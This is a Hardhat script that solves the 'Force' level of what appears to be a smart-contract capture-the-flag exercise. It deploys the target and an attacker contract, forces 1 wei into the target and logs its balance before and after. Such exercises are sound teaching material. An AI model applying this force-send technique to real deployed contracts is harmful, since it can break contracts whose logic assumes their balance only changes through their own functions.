import { ethers, getNamedAccounts } from 'hardhat';

import deployContract from '../deploy/07-force';
import deployContractAttack from '../deploy/07-force-attacker';

const INSTANCE_CONTRACT_NAME = 'Force';
const ATTACKER_CONTRACT_NAME = 'ForceAttacker';

async function main() {
  console.log(`Passing ${INSTANCE_CONTRACT_NAME} challenge...`);

  const { hacker: hackerAddress } = await getNamedAccounts();
  const hacker = await ethers.getSigner(hackerAddress);

  const contractAddress = await deployContract();

  const contractAttackAddress = await deployContractAttack();
  const contractAttackInstance = await ethers.getContractAt(ATTACKER_CONTRACT_NAME, contractAttackAddress);
  const contractAttack = contractAttackInstance.connect(hacker);

  const initialContractBalance = await ethers.provider.getBalance(contractAddress);
  console.log('Initial Contract Balance: ', initialContractBalance);

  await contractAttack.attack({ value: ethers.parseUnits('1', 'wei') });

  const newContractBalance = await ethers.provider.getBalance(contractAddress);
  console.log('New Contract Balance: ', newContractBalance);

  console.log('Well done, You have completed this level!!!');
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
